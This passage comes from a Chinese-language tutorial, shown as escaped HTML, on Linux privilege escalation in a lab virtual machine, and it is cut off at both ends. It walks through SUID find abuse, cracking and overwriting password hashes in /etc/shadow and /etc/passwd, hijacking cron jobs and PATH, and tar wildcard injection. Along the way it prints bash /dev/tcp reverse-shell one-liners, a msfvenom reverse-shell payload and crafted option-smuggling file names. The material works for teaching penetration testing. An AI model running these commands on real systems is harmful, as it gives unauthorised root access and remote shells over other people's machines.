operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;_&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;env&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;计算机名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;osboxes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;系统路径列表&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;开启的服务&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql 开启&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vboxadd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;statd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user5&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user7&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user8&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;suid提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid提权&#34;&gt;#&lt;/a&gt; SUID 提权&lt;/h4&gt;
&lt;p&gt;SUID（Set User ID）是一种权限设置，允许用户以文件所有者的权限来执行文件，即使用户自身的权限可能不足以执行该文件。&lt;/p&gt;
&lt;p&gt;在 Unix 或类 Unix 系统中，当一个可执行文件的 SUID 位被设置为 1 时，无论谁执行该文件，都会以该文件的所有者身份执行。这种权限设置通常用于系统文件或程序，以便允许普通用户执行特定的任务或命令，而无需暴露超出其权限范围的访问权限。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null find / -user root -perm -4000-print2&amp;gt;/dev/null find / -user root -perm -4000-exec ls -ldb &amp;#123;&amp;#125; \;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 Unix 或 Linux 系统中查找具有 SUID 权限设置的文件。它会搜索整个文件系统 (“/”)，找到具有 SUID 权限设置的文件 (“-perm  -u=s”) 并将它们显示出来。同时，将任何错误消息重定向到 /dev/null，以避免它们显示在屏幕上。&lt;/p&gt;
&lt;p&gt;常见的提权文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查询到有一个 find&lt;/p&gt;
&lt;p&gt;cd /  cd /tmp 到 tmp 目录&lt;/p&gt;
&lt;p&gt;创建一个文件&lt;/p&gt;
&lt;p&gt;touch 1234&lt;/p&gt;
&lt;p&gt;find 1234 -exec whoami ;&lt;/p&gt;
&lt;p&gt;这个命令的作用是在当前目录下搜索名为 “1234” 的文件或目录，并对找到的每一个执行  &lt;code&gt;whoami&lt;/code&gt;  命令。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find&lt;/code&gt;  命令用于查找文件和目录， &lt;code&gt;-exec&lt;/code&gt;  选项允许在找到的每一个项目上执行特定的命令， &lt;code&gt;\;&lt;/code&gt;  表示命令结束。&lt;/p&gt;
&lt;p&gt;如果在当前目录下存在名为 “1234” 的文件或目录，对于每一个找到的 “1234”， &lt;code&gt;whoami&lt;/code&gt;  命令将被执行，显示当前执行命令的用户的用户名。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132333459.png&#34; alt=&#34;image-20240207132333459&#34;&gt;&lt;/p&gt;
&lt;p&gt;反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find /etc/passwd -exec bash -ip &amp;gt;&amp;amp; /dev/tcp/192.168.244.128/4343 0&amp;gt;&amp;amp;1 \;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nc 开启监听接收到会话&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132540518.png&#34; alt=&#34;image-20240207132540518&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;可读shadow文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可读shadow文件利用&#34;&gt;#&lt;/a&gt; 可读 shadow 文件利用&lt;/h3&gt;
&lt;p&gt;Shadow 文件的概述:&lt;/p&gt;
&lt;p&gt;Shadow 文件是一个 Linux 系统中存储加密用户密码和其他身份信息，如账号过期时间，密码过期时间，账户锁定和密码最小长度等等的重要文件。&lt;/p&gt;
&lt;p&gt;Shadow 文件位于 /etc/shadow ，只有 root 用户有权限访问它。&lt;/p&gt;
&lt;p&gt;shadow 文件与 passwd 文件的关系：早些版本加密后的密码是保存在 passwd 文件里第二个字段的位置也就是图中 x 的位置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221212919749.png&#34; alt=&#34;image-20240221212919749&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是呢虽然是加密的还是有可能被破解所以加上了 shadow 这个文件而 passwd 文件里的就被替换为了 X 占位，因为 shadow 文件只有 root 用户可以访问所以相对比较安全，不过有时管理员对文件权限错误配置也会导致被拿来恶意利用&lt;/p&gt;
&lt;p&gt;文件格式：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root:&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mqjgcFoM&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$X&lt;/span&gt;/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;利用条件 shadow 有权查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213805632.png&#34; alt=&#34;image-20240221213805632&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取 root 用户信息并保存在新建文件中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213918116.png&#34; alt=&#34;image-20240221213918116&#34;&gt;&lt;/p&gt;
&lt;p&gt;root:&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;6&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::&lt;/p&gt;
&lt;p&gt;利用工具 john 来破解&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220225042.png&#34; alt=&#34;image-20240221220225042&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到明文密码就可以切换 root 了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220330572.png&#34; alt=&#34;image-20240221220330572&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;可写shadow文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可写shadow文件利用&#34;&gt;#&lt;/a&gt; 可写 shadow 文件利用&lt;/h3&gt;
&lt;p&gt;利用原理：把 shadow 文件里 root 用户 hash 值替换为自己生成的就可以 hash 再用生成用到的明文进行登录 root&lt;/p&gt;
&lt;p&gt;前提要有 shadow 可写权限&lt;/p&gt;
&lt;p&gt;通过 mkpasswd 生成哈希&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mkpasswd -m sha-512 1234567&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$6$hpRA5YNV9lAANtsF$JwX/K8VfxhxpTm5U2oTEgFw.YiYVCmfzZ0i6SqUDkpJRamWVmQ0LgflQUlhjVHkAS5N8MwFFR12mHBg6qFhwC/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221309745.png&#34; alt=&#34;image-20240221221309745&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 sha-512 是因为&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;$开头的，表明是用SHA-512加密的，密文长度86&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;$ 表明是用MD5加密的，密文长度22个字符&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$2&lt;/span&gt;$ 是用Blowfish加密的，&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$5&lt;/span&gt;$ 是用 SHA-256加密的，密文长度43&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接着把生成的 hash 替换原本的就可以用 1234567 登陆了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221617115.png&#34; alt=&#34;image-20240221221617115&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;可写passwd文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可写passwd文件利用&#34;&gt;#&lt;/a&gt; 可写 passwd 文件利用&lt;/h3&gt;
&lt;p&gt;虽然 passwd 文件里 hash 被 X 替代了无法查看但是把 X 替换为我们生成的 hash 还是可以登陆的&lt;/p&gt;
&lt;p&gt;利用 openssl 生成&lt;/p&gt;
&lt;p&gt;&lt;code&gt;openssl passwd 987654321&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$1$uOZ/Tr4f$EqDyR9WU8wJNeB3tEY09f.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;把 passwd 里 root 的 X 替换&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221222616639.png&#34; alt=&#34;image-20240221222616639&#34;&gt;&lt;/p&gt;
&lt;p&gt;即可用 987654321 切换 root&lt;/p&gt;
&lt;h3 id=&#34;计划任务提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务提权&#34;&gt;#&lt;/a&gt; 计划任务提权&lt;/h3&gt;
&lt;p&gt;查看计划任务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222000243892.png&#34; alt=&#34;image-20240222000243892&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;* * * * * root    /home/crontab.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这条计划任务的意思是每 1 分钟执行一次 crontab.sh 脚本，并且是以 root 用户的权限来执行。&lt;/p&gt;
&lt;p&gt;而这个文件我们是有权更改的那么就可以写入反弹 shell 命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.139/4444 0&amp;gt;&amp;amp;1&amp;quot;&#39; &amp;gt; crontab.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nc 进行监听等一分钟拿 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222003928818.png&#34; alt=&#34;image-20240222003928818&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222005508201.png&#34; alt=&#34;image-20240222005508201&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;计划任务环境变量提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务环境变量提权&#34;&gt;#&lt;/a&gt; 计划任务环境变量提权&lt;/h3&gt;
&lt;p&gt;如果你在计划任务中没有指定程序的绝对路径，系统会在 crontab 文件中的 &lt;code&gt;PATH&lt;/code&gt;  环境变量所列出的目录中查找该程序。这些目录会按照在 &lt;code&gt;PATH&lt;/code&gt;  变量中的顺序被检查。如果在某个目录中找到了该程序，系统就会停止搜索并执行该程序。&lt;/p&gt;
&lt;p&gt;图中每分钟执行一次 &lt;code&gt;shell.sh&lt;/code&gt;  脚本但是没有指定绝对路径， &lt;code&gt;PATH&lt;/code&gt;  中默认优先查找 /home/yunyi 路径下有没有 shell.sh 有的话&lt;/p&gt;
&lt;p&gt;就每分钟执行，利用这个特性就可以在 &lt;code&gt;yunyi&lt;/code&gt;  目录中创建一个 &lt;code&gt;shell.sh&lt;/code&gt;  并写上反弹 shell 进行提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png&#34; alt=&#34;image-20240223220655325&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#!/bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/7676 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220835815.png&#34; alt=&#34;image-20240223220835815&#34;&gt;&lt;/p&gt;
&lt;p&gt;别忘了给执行权限 &lt;code&gt;chmod +x shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;kali：nc -vlnp 7676&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;获取 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221033086.png&#34; alt=&#34;image-20240223221033086&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;计划任务通配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务通配符提权&#34;&gt;#&lt;/a&gt; 计划任务通配符提权&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png&#34; alt=&#34;image-20240223220655325&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里还有一个 zip.sh 看一下内容是&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221316077.png&#34; alt=&#34;image-20240223221316077&#34;&gt;&lt;/p&gt;
&lt;p&gt;到 home/yunyi/user 目录下打包所有文件夹文件到 /tmp 目录下名为 yunyi.tar.gz&lt;/p&gt;
&lt;p&gt;利用 tar &lt;code&gt;命令的&lt;/code&gt; –checkpoint &lt;code&gt;和&lt;/code&gt; –checkpoint-action&lt;/p&gt;
&lt;p&gt;tar &lt;code&gt;命令的&lt;/code&gt; –checkpoint &lt;code&gt;和&lt;/code&gt; –checkpoint-action &lt;code&gt;参数可以被用来执行提权操作这是因为&lt;/code&gt;  tar` 命令在处理文件时，可以在每个检查点 checkpoint 执行一个特定的动作 action&lt;/p&gt;
&lt;p&gt;如果管理员给予了某个普通用户 &lt;code&gt;tar&lt;/code&gt;  命令的超级管理员操作权限，那么我们可以使用 &lt;code&gt;tar&lt;/code&gt;  命令进行提权例如，以下命令可以创建一个新的归档文件，并在每个检查点执行 &lt;code&gt;/bin/bash&lt;/code&gt;  命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&amp;quot;/bin/bash&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在这个命令中， &lt;code&gt;--checkpoint=1&lt;/code&gt;  表示每处理一个文件就设置一个检查点， &lt;code&gt;--checkpoint-action=exec=&amp;quot;/bin/bash&amp;quot;&lt;/code&gt;  表示在每个检查点执行 &lt;code&gt;/bin/bash&lt;/code&gt;  命令因为 &lt;code&gt;tar&lt;/code&gt;  命令是以 &lt;code&gt;root&lt;/code&gt;  用户的身份运行的，所以 &lt;code&gt;/bin/bash&lt;/code&gt;  命令也会以 &lt;code&gt;root&lt;/code&gt;  用户的身份运行，从而获得 &lt;code&gt;root&lt;/code&gt;  权限&lt;/p&gt;
&lt;p&gt;kali 生成反弹 shell 文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=8989 -f elf -o shell.elf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;启动一个 http 服务受害机下载 shell 文件并给予权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132512587.png&#34; alt=&#34;image-20240224132512587&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132558854.png&#34; alt=&#34;image-20240224132558854&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 user 目录创建这两个文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint-action=exec=shell.elf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224133036613.png&#34; alt=&#34;image-20240224133036613&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224140015673.png&#34; alt=&#34;image-20240224140015673&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lvnp 8989&lt;/code&gt;  拿到权限&lt;/p&gt;
&lt;p&gt;也可以创建一个 sh 脚本反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint-action=exec=sh shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;suid原理详解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid原理详解&#34;&gt;#&lt;/a&gt; SUID 原理详解&lt;/h3&gt;
&lt;h4 id=&#34;suid共享库提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid共享库提权&#34;&gt;#&lt;/a&gt; SUID 共享库提权&lt;/h4&gt;
&lt;p&gt;其实 suid 提权原理就是利用有 s 位的程序去执行我们的恶意文件恶意命令&lt;/p&gt;
&lt;p&gt;编写一个有漏洞的程序&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;dlfcn.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; 